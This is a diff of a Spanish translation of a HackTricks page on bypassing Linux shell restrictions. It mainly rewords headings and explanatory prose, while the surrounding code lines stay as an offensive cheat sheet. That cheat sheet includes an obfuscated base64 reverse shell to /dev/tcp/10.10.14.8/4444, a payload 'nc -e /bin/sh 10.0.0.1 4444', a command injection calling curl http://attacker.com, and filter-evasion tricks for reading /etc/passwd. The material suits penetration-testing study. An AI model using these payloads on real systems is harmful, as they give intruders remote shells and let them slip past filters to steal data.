@@ -12,7 +12,7 @@ Las colecciones de command-injection y WAF-evasion de PayloadsAllTheThings, la c
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### Rev shell corto
+### Rev shell corta
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -20,7 +20,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Rutas de Bypass y palabras prohibidas
+### Bypass Paths y palabras prohibidas
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -80,7 +80,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Bypass de espacios prohibidos
+### Omitir espacios prohibidos
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -107,12 +107,12 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Evasión de la barra invertida y la barra normal
+### Evadir la barra invertida y la barra diagonal
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass pipes
+### Omitir pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -126,12 +126,12 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Evitar IPs
+### Bypass IPs
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
 ```
-### Exfiltración de datos basada en tiempo
+### Exfiltración de datos basada en el tiempo
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
@@ -142,12 +142,12 @@ echo ${PATH:0:1} #/
 ```
 ### Exfiltración de datos mediante DNS
 
-Para callbacks out-of-band, un servicio de estilo collaborator como Burp Collaborator puede inducir a una aplicación objetivo a interactuar con un servidor externo; el enlace existente a [**pingb**](http://pingb.in) se conserva como navegación histórica, no como una afirmación sobre su disponibilidad actual.<sup>[[6]](#references)</sup>
+Para las callbacks out-of-band, un servicio de estilo collaborator, como Burp Collaborator, puede inducir a una aplicación objetivo a interactuar con un servidor externo; se conserva el enlace existente a [**pingb**](http://pingb.in) como navegación histórica, no como una afirmación sobre su disponibilidad actual.<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-En una shell restringida, los builtins disponibles son la superficie de comandos restante para estos ejemplos; Bash documenta sus comandos builtin y la gramática de ejecución.<sup>[[7]](#references)</sup> Idea de [**devploit**](https://twitter.com/devploit).\
-Comienza con la navegación existente de [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) y después prueba las siguientes técnicas específicas de Bash:<sup>[[7]](#references)</sup>
+En un shell restringido, los builtins disponibles son la superficie de comandos restante para estos ejemplos; Bash documenta sus comandos builtin y la gramática de ejecución.<sup>[[7]](#references)</sup> Idea de [**devploit**](https://twitter.com/devploit).\
+Comienza con la navegación existente hacia [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) y, a continuación, prueba las siguientes técnicas específicas de Bash:<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -204,21 +204,21 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Bypass de posibles regexes
+### Bypass posibles regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
 ### Bashfuscator
 
-La siguiente invocación utiliza Bashfuscator, un framework de ofuscación de Bash de código abierto; el enlace al repositorio en el comentario del código se conserva como navegación.<sup>[[8]](#references)</sup>
+La siguiente invocación utiliza Bashfuscator, un framework de ofuscación de Bash de código abierto; el enlace al repositorio incluido en el comentario del código se conserva como navegación.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
 ### RCE con 5 caracteres
 
-Los siguientes dos ejemplos históricos de 5 caracteres se conservan como reproducciones de desafíos: el repositorio principal del desafío está disponible en el [repositorio de Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), mientras que el segundo enlace al write-up en el bloque de código es una navegación cuya disponibilidad actual no se verificó.<sup>[[9]](#references)</sup>
+Los siguientes dos ejemplos históricos de 5 caracteres se conservan como reproducciones de desafíos: el repositorio principal del desafío está disponible en el [repositorio de Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), mientras que el segundo enlace de write-up en el bloque de código es una navegación cuya disponibilidad actual no se verificó.<sup>[[9]](#references)</sup>
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -302,50 +302,50 @@ ln /f*
 ```
 ## Bypass de Read-Only/Noexec/Distroless
 
-Si estás dentro de un sistema de archivos con **protecciones read-only y noexec**, o en una **imagen distroless**, el entorno impone restricciones de ejecución documentadas por Linux `mount(8)` y el proyecto Distroless; la página enlazada recopila técnicas para trabajar dentro de ellas.<sup>[[11]](#references)[[12]](#references)</sup>
+Si estás dentro de un filesystem con protecciones **read-only y noexec**, o en una **distroless image**, el entorno impone restricciones de ejecución documentadas por Linux `mount(8)` y el proyecto Distroless; la página enlazada recopila técnicas para trabajar dentro de estas restricciones.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Chroot y otros Jails Bypass
+## Bypass de Chroot y otros Jails
 
 {{#ref}}
 ../../main-system-information/escaping-from-limited-bash.md
 {{#endref}}
 
-## NOP Sled de Bash basado en espacios ("Bashsledding")
+## Space-Based Bash NOP Sled ("Bashsledding")
 
-Cuando una vulnerabilidad permite controlar parcialmente un argumento que finalmente llega a `system()` u otro shell, el offset del payload puede ser incierto. Alan Cao y Will Tan describen un caso restringido en un dispositivo embebido en el que un payload de shell se distribuyó por la NVRAM mapeada en memoria y se prefijó con espacios.<sup>[[5]](#references)</sup>
+Cuando una vulnerabilidad permite controlar parcialmente un argumento que finalmente llega a `system()` u otro shell, el offset del payload puede ser incierto. Alan Cao y Will Tan describen un caso restringido en un dispositivo embebido en el que un shell payload se distribuyó por la NVRAM mapeada en memoria y se antepusieron espacios.<sup>[[5]](#references)</sup>
 
-Por lo tanto, puedes crear un *NOP sled para Bash* prefijando tu comando real con una secuencia larga de espacios o caracteres de tabulación; Bash define los espacios y las tabulaciones como blanks que separan palabras en un comando simple.<sup>[[5]](#references)[[7]](#references)</sup>
+Por lo tanto, puedes crear un *NOP sled para Bash* anteponiendo a tu comando real una larga secuencia de espacios o caracteres de tabulación; Bash define los espacios y las tabulaciones como blanks que separan palabras en un simple comando.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Si una cadena ROP (u otra primitiva de corrupción de memoria) pasa un puntero a una cadena de comandos que comienza en cualquier posición dentro del bloque de espacios, Bash puede analizar los espacios iniciales restantes hasta llegar al comando; en el exploit del router d, esto permitió usar offsets de cadena inciertos.<sup>[[5]](#references)[[7]](#references)</sup>
+Si una cadena ROP (u otra primitive de corrupción de memoria) pasa un puntero a una cadena de comandos que comienza en cualquier punto dentro del bloque de espacios, Bash puede analizar los espacios iniciales restantes hasta llegar al comando; en el exploit del router citado, esto permitió utilizar offsets de cadena inciertos.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Los casos de uso prácticos en objetivos embebidos con restricciones incluyen:<sup>[[5]](#references)</sup>
+Los casos de uso prácticos en objetivos embebidos restringidos incluyen:<sup>[[5]](#references)</sup>
 
 1. **Blobs de configuración mapeados en memoria** (p. ej., NVRAM) que son accesibles entre procesos.<sup>[[5]](#references)</sup>
-2. Canales de payload en los que el atacante no puede escribir bytes NULL para alinear el payload (una adaptación general del problema de alineación).<sup>[[5]](#references)</sup>
+2. Canales de payload donde el atacante no puede escribir bytes NULL para alinear el payload (una adaptación general del problema de alineación).<sup>[[5]](#references)</sup>
 3. Dispositivos embebidos con un entorno pequeño de BusyBox `ash`/`sh`, que BusyBox documenta como applets en sistemas con recursos limitados.<sup>[[10]](#references)</sup>
 
-> 🛠️  Combina esta técnica con gadgets ROP que llamen a `system()` en un laboratorio controlado; la investigación sobre el router d demuestra esta combinación en hardware con restricciones.<sup>[[5]](#references)</sup>
+> 🛠️  Combina esta técnica con gadgets ROP que llamen a `system()` en un laboratorio controlado; la investigación citada sobre el router demuestra esta combinación en hardware restringido.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [PayloadsAllTheThings - Inyección de comandos](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
-- [2] [Bo0oM - Hoja de referencia para evadir WAF](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
+- [2] [Bo0oM - Hoja de trucos para evadir WAF](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [3] [Técnicas de evasión de Web Application Firewall (WAF) n.º 2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 - [4] [Técnicas de evasión de Web Application Firewall (WAF) n.º 3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao y Will Tan — Explotación de zero days en hardware abandonado – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [5] [Alan Cao y Will Tan — Explotando zero days en hardware abandonado – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — página del manual de Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — Página del manual de Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 - [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 {{#include ../../../banners/hacktricks-training.md}}
